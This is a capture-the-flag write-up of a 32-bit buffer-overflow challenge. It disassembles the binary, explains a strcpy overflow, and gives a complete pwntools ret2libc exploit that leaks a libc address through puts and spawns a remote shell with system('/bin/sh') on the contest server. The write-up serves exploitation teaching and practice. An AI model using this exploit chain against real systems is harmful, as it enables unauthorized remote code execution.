# OldSchool-NewAge

- **Category :** pwn
- **Points :** 75
- **Challenge Description :**
```
It all started with a leak bang
```

## Writeup

We are being provided with a tar file containing two files, an executable and a libc. Let's first run file on them :

```
$ file vuln4 libc.so.6
vuln4:     ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked
libc.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked
```

We can start to guess that this challenge will have to do with leaking stuff from libc (thanks to the presence of the library and the hint in the challenge description).
Let's first take a look at the main function of the program with r2 :
```
   sym.main ();
│           ; var int local_3ah @ ebp-0x3a
│           ; var int local_4h @ ebp-0x4
│           ; var int local_4h_2 @ esp+0x4
│           0x080484ea      8d4c2404       lea ecx, esp + 4            ; 4
│           0x080484ee      83e4f0         and esp, 0xfffffff0
│           0x080484f1      ff71fc         push dword [ecx - 4]
│           0x080484f4      55             push ebp
│           0x080484f5      89e5           mov ebp, esp
│           0x080484f7      51             push ecx
│           0x080484f8      83ec44         sub esp, 0x44               ; 'D'
│           0x080484fb      83ec0c         sub esp, 0xc
│           0x080484fe      6800860408     push str.This_time_it_is_randomized... ; 0x8048600 ; "This time it is randomized..."
│           0x08048503      e898feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048508      83c410         add esp, 0x10
│           0x0804850b      83ec0c         sub esp, 0xc
│           0x0804850e      681e860408     push str.You_should_find_puts_yourself ; 0x804861e ; "You should find puts yourself"
│           0x08048513      e888feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048518      83c410         add esp, 0x10
│           0x0804851b      a1a4980408     mov eax, dword [obj.stdout] ; [0x80498a4:4]=0
│           0x08048520      83ec0c         sub esp, 0xc
│           0x08048523      50             push eax
│           0x08048524      e847feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x08048529      83c410         add esp, 0x10
│           0x0804852c      a1a0980408     mov eax, dword [obj.stdin]  ; [0x80498a0:4]=0
│           0x08048531      83ec04         sub esp, 4
│           0x08048534      50             push eax
│           0x08048535      68c8000000     push 0xc8                   ; 200
│           0x0804853a      8d45c6         lea eax, ebp - 0x3a
│           0x0804853d      50             push eax
│           0x0804853e      e83dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x08048543      83c410         add esp, 0x10
│           0x08048546      83ec0c         sub esp, 0xc
│           0x08048549      8d45c6         lea eax, ebp - 0x3a
│           0x0804854c      50             push eax
│           0x0804854d      e879ffffff     call sym.copy_it
│           0x08048552      83c410         add esp, 0x10
│           0x08048555      83ec0c         sub esp, 0xc
│           0x08048558      683c860408     push str.done               ; 0x804863c ; "done!"
│           0x0804855d      e83efeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048562      83c410         add esp, 0x10
│           0x08048565      b800000000     mov eax, 0
│           0x0804856a      8b4dfc         mov ecx, dword [local_4h]
│           0x0804856d      c9             leave
│           0x0804856e      8d61fc         lea esp, ecx - 4
└           0x08048571      c3             ret
```

So we have a fgets reading 0xc8 characters into a stack allocated buffer, and this buffer is then copied with the copy_it function to another buffer in memory. Let's take a look at copy_it.

```
│   sym.copy_it ();
│           ; var int local_12h @ ebp-0x12
│              ; CALL XREF from 0x0804854d (sym.main)
│           0x080484cb      55             push ebp
│           0x080484cc      89e5           mov ebp, esp
│           0x080484ce      83ec18         sub esp, 0x18
│           0x080484d1      83ec08         sub esp, 8
│           0x080484d4      ff7508         push dword [ebp + 8]
│           0x080484d7      8d45ee         lea eax, ebp - 0x12
│           0x080484da      50             push eax
│           0x080484db      e8b0feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x080484e0      83c410         add esp, 0x10
│           0x080484e3      b800000000     mov eax, 0
│           0x080484e8      c9             leave
└           0x080484e9      c3             ret
```

The copy function uses strcpy, which means that it doesn't take into account the string length during the copy, and since we are calling it with pointers to stack allocated buffers things will get nasty.
If we try to input a large number of chars we get a segfault, and eip control, so we need to build a strategy to exploit this.

What we know:
- The binary has ASLR enabled
- The binary has the NX bit enabled
- The call convention has the arguments on the stack
- We only have a few libc functions available to us (fflush, fgets, strcpy, puts).

## Strategy
Since the arguments are on the stack, we can build our own fake stack frames to call functions. If we take a look at our functions we can see that we have puts, which can allow us to read arbitrary memory locations. And this is where the leaking part of this challenge is, we can leak libc function addresses by reading from the GOT with puts, and build on that. We can outline the following strategy :

- Call puts(address of fgets) and leak fgets address
- Compute libc base address (fgets leak - fgets in libc)
- Compute system address
- Compute "/bin/sh" address in libc
- Return to _start
- Call system("/bin/sh")
- ???
- Profit!

Note : Returning to _start allowed us to reset our stack to a sane state, and also allowed us to be able to exploit the program again without actually crashing it (and re-randomizing the addresses again)

We can then just navigate to the ctfuser home directory and cat the flag !
```
$ cat /home/ctfuser/flag
SharifCTF{7af9dab81dff481772609b97492d6899}
```

## Exploit script

```python
from pwn import *

overflow_offset = 22

puts_bin_addr = 0x80483a0
fgets_got = 0x804986c

main_addr = 0x80484ea
_start_addr = 0x80483d0

fgets_libc_addr = 0x0005e150 # 0x00065c50 locally
bin_sh_libc_addr = 0x0015ba0b # 0x0017882a locally
system_libc_addr = 0x0003ada0 # 0x0003c7d0 locally

# Goal : Leak puts addr and call system
# step 1 : Leak fgets
# - Build a false stack frame
# - Call puts with delta GOT offset as argument
# - Read addr and compute delta

p = remote("ctf.sharif.edu",4801)
p.recv(4096)

stage1 = "A"*overflow_offset
stage1 += p32(puts_bin_addr)
stage1 += p32(_start_addr) # return address
stage1 += p32(fgets_got)

log.info("Leaking fgets got ...")
p.sendline(stage1)

leak = p.recv(4096)

fgets_got_entry = u32(leak[0:4])

log.info("fgets got address : {}".format(hex(fgets_got_entry)))

libc_base_addr = fgets_got_entry - fgets_libc_addr

bin_sh_addr = libc_base_addr + bin_sh_libc_addr
system_addr = libc_base_addr + system_libc_addr

log.info("libc base addr is : {}".format(hex(libc_base_addr)))
log.info("/bin/sh string addr is : {}".format(hex(bin_sh_addr)))
log.info("system addr is : {}".format(hex(system_addr)))


# step 2 : exploit
# - Call main again
# - Call system("/bin/sh")
# - Profit !

log.info("Getting remote shell ...")
stage2 = "A"*overflow_offset
stage2 += p32(system_addr)
stage2 += p32(_start_addr)
stage2 += p32(bin_sh_addr)

p.sendline(stage2)

# Remote shell
p.interactive()
```

